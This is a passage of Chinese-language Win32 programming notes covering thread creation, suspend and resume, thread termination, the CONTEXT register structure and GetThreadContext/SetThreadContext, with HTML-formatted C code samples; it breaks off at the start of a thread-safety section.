class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;resource.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">HWND text1;</span><br><span class=\"line\">HWND text2;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc</span><span class=\"params\">(LPVOID lpParameter)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tTCHAR szBuffer1[<span class=\"number\">10</span>];</span><br><span class=\"line\">\tTCHAR szBuffer2[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(szBuffer1,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(szBuffer2,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\">\tDWORD dwTimer1;</span><br><span class=\"line\">\tDWORD dwTimer2;</span><br><span class=\"line\">\tDWORD a = <span class=\"number\">1000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(a-- &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tGetWindowText(text1,szBuffer1,<span class=\"number\">10</span>);</span><br><span class=\"line\">\t\tGetWindowText(text2,szBuffer2,<span class=\"number\">10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"built_in\">sscanf</span>( szBuffer1, <span class=\"string\">&quot;%d&quot;</span>, &amp;dwTimer1 );\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">sscanf</span>( szBuffer2, <span class=\"string\">&quot;%d&quot;</span>, &amp;dwTimer2 );\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(szBuffer1,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(szBuffer2,<span class=\"number\">0</span>,<span class=\"number\">10</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(szBuffer1,<span class=\"string\">&quot;%d&quot;</span>,--dwTimer1);\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(szBuffer2,<span class=\"string\">&quot;%d&quot;</span>,++dwTimer2);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tSetWindowText(text1,szBuffer1);\t</span><br><span class=\"line\">\t\tSetWindowText(text2,szBuffer2);\t</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">MyTest</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hThread = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    ::CloseHandle(hThread);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CALLBACK <span class=\"title function_\">DialogProc</span><span class=\"params\">(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\ttext1 = GetDlgItem(hDlg,IDC_EDIT);\t</span><br><span class=\"line\">\ttext2 = GetDlgItem(hDlg,IDC_EDIT2);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (uMsg)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> WM_CLOSE:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tEndDialog(hDlg,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_INITDIALOG:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tSetWindowText(text1,<span class=\"string\">&quot;999&quot;</span>);\t</span><br><span class=\"line\">\t\t\tSetWindowText(text2,<span class=\"string\">&quot;0&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> WM_COMMAND:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">switch</span>(LOWORD(wParam))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> IDC_BUTTON:</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tMyTest();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"comment\">//处理当前程序不关心的消息类型</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     HINSTANCE hPrevInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.</span></span><br><span class=\"line\">\tDialogBox(hInstance,MAKEINTRESOURCE(IDD_DIALOG),<span class=\"literal\">NULL</span>,DialogProc);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"线程控制\"><a class=\"markdownIt-Anchor\" href=\"#线程控制\">#</a> 线程控制</h3>\n<p>线程挂起之后是不分 cpu 的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">挂起线程：\t\t\t</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">::SuspendThread(hThread);\t\t\t</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">恢复线程：\t\t\t</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">::ResumeThread(hThread);\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>恢复线程需要看调度程序是否空闲</p>\n<p>线程退出之后这个线程的堆栈会被释放</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">方式一：\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">::ExitThread(DWORD dwExitCode);\t\t</span><br><span class=\"line\">exitcode决定了程序返回什么代码</span><br><span class=\"line\">这个函数不会释放资源在退出之前 </span><br><span class=\"line\">同步执行</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">方式二：\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">线程函数返回\t\t\t</span><br><span class=\"line\">    </span><br><span class=\"line\">可以在结束前干一些事情 </span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">方式三：\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">::TerminateThread(hThread,<span class=\"number\">2</span>);\t\t\t\t</span><br><span class=\"line\">异步调用，可能会导致程序执行顺序问题，函数返回的时候线程可能还没退出。退出后堆栈还在</span><br><span class=\"line\"></span><br><span class=\"line\">::WaitForSingleObject(hThread,INFINITE);\t\t\t\t</span><br><span class=\"line\">线程阻塞，直到线程退出</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">判断线程是否结束\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL GetExitCodeThread(\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  HANDLE hThread,\t\t\t\t\t\t\t\t</span><br><span class=\"line\">  LPDWORD lpExitCode\t\t\t\t\t\t\t\t</span><br><span class=\"line\">);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">STILL_ACTIVE 正在运行\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">参数：\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">hThread: 要结束的线程句柄\t\t\t\t\t\t\t\t</span><br><span class=\"line\">dwExitCode: 指定线程的退出代码。可以通过GetExitCodeThread来查看一个线程的退出代码\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"context\"><a class=\"markdownIt-Anchor\" href=\"#context\">#</a> context</h3>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">每个线程在执行的时候，都会独自占用一个CPU,当系统中的线程数量 &gt; CPU的数量时，就会存在多个线程共用一个CPU\t\t\t\t\t\t\t</span><br><span class=\"line\">的情况。但CPU每次只能运行一个线程，Windows每隔<span class=\"number\">20</span>毫秒会进行线程的切换，那比如线程A执行到地址：<span class=\"number\">0x2345678</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">eax:<span class=\"number\">1</span> ecx:<span class=\"number\">2</span> edx:<span class=\"number\">3</span> ebx:<span class=\"number\">4.</span>..还有eflag标志寄存器中的值等等。。。\t\t\t\t\t\t\t</span><br><span class=\"line\">此时，线程执行时间到了，被切换到了线程B。。。。当线程B的时间片也到了，再切换会线程A时，系统是如何知道该\t\t\t\t\t\t\t</span><br><span class=\"line\">从哪个地址开始执行呢？被切换前用到的各种寄存器的值该如何恢复呢？\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">CONTEXT：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">该结构包含了特定处理器的寄存器数据。\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">CONTEXT</span> &#123;</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// The flags values within this flag control the contents of\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// a CONTEXT record.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// If the context record is used as an input parameter, then\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// for each portion of the context record controlled by a flag\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// whose value is set, it is assumed that that portion of the\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// context record contains valid context. If the context record\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// is being used to modify a threads context, then only that\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// portion of the threads context will be modified.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// If the context record is used as an IN OUT parameter to capture\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// the context of a thread, then only those portions of the thread&#x27;s\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// context corresponding to set flags will be returned.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// The context record is never used as an OUT only parameter.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD ContextFlags;\t     <span class=\"comment\">// 可以决定获取到哪些寄存器的值   context_full + debug = 所有寄存器\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// included in CONTEXT_FULL.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\tdebug 寄存器\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Dr0;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Dr1;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Dr2;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Dr3;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Dr6;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Dr7;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    FLOATING_SAVE_AREA FloatSave;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_SEGMENTS.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   SegGs;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   SegFs;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   SegEs;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   SegDs;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_INTEGER.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Edi;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Esi;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Ebx;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Edx;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Ecx;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Eax;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// ContextFlags word contians the flag CONTEXT_CONTROL.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Ebp;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   Eip;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   SegCs;              <span class=\"comment\">// MUST BE SANITIZED\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    DWORD   EFlags;             <span class=\"comment\">// MUST BE SANITIZED\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    DWORD   Esp;\t\t\t\t\t\t\t</span><br><span class=\"line\">    DWORD   SegSs;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// This section is specified/returned if the ContextFlags word\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// contains the flag CONTEXT_EXTENDED_REGISTERS.\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">// The format and contexts are processor specific\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    <span class=\"comment\">//\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125; CONTEXT;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">获取线程CONTEXT结构：\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//挂起线程\t\t\t\t\t\t\t</span></span><br><span class=\"line\">SuspendThread(线程句柄);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">CONTEXT context\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//设置要获取寄存器的类型\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">context.ContextFlags = CONTEXT_CONTROL;\t\t \t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//获取\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL ok = ::GetThreadContext(hThread,&amp;context);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\">//设置\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">context.Eip = <span class=\"number\">0x401000</span>;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">SetThreadContext(hThread,&amp;context);\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 切换线程</span></span><br><span class=\"line\"></span><br><span class=\"line\">::ResumeThread(hThread);    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 但是没保存寄存器，所以程序并不能完成运行</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"线程安全问题\"><a class=\"markdownIt-Anchor\" href=\"#线程安全问题\">#</a> 线程安全问题</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HWND hEdit ;\t\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc1</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\tTCHAR szBuffer[<span class=\"number\">10</span>];\t\t\t\t</span><br><span class=\"line\">\tDWORD dwIndex = <span class=\"number\">0</span>;\t\t\t\t</span><br><span class=\"line\">\tDWORD dwCount;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(dwIndex&lt;<span class=\"number\">10</span>)\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t</span><br><span class=\"line\">\t\tGetWindowText(hEdit,szBuffer,<span class=\"number\">10</span>);\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">sscanf</span>( 